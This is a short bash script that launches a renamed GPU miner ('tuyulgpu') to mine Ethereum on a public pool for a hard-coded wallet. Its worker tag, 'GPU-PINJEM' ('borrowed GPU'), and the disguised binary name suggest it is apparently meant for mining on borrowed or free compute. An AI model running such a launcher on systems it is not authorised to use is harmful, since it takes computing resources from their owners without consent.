#!/bin/bash
POOL=eth.2miners.com:2020
WALLET=0xc6601e3308cfe311faa2236b9578ae3cfad2c82a
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)

chmod +x tuyulgpu
./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
